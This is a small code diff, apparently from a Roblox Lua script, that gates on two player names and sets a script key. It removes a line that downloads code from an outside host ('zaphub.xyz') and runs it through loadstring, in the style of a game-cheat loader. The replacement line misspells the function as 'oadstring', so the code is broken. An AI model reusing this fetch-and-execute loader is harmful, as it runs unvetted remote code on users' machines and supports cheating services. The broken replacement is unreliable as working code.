@@ -5,7 +5,7 @@ if player.Name == "HammerStorm_999"
     or player.Name == "NoobestBacon_47" then
 
     script_key = "wUyvmjsmuvRIwOPwLszkupgIOvvIkoYq"
-    loadstring(game:HttpGet("https://zaphub.xyz/Exec"))()
+    oadstring(game:HttpGet("https://zaphub.xyz/Exec"))()
 
 else
 
